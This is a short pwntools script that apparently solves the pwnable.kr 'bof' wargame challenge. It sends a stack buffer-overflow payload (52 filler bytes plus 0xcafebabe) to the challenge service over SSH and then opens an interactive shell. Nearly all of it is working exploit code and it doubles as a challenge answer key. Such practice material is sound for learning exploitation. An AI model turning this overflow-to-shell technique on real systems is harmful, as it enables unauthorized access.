from pwn import *

payload = b"A"*52 + p32(0xcafebabe)

con = ssh(user="bof",host="pwnable.kr",port=2222,password="guest")
proc = con.remote("localhost",9000)
#proc = con.process("/home/bof/bof")
#proc.recvuntil(b"overflow me : ")
proc.sendline(payload)
#print(proc.recvall())
proc.interactive()
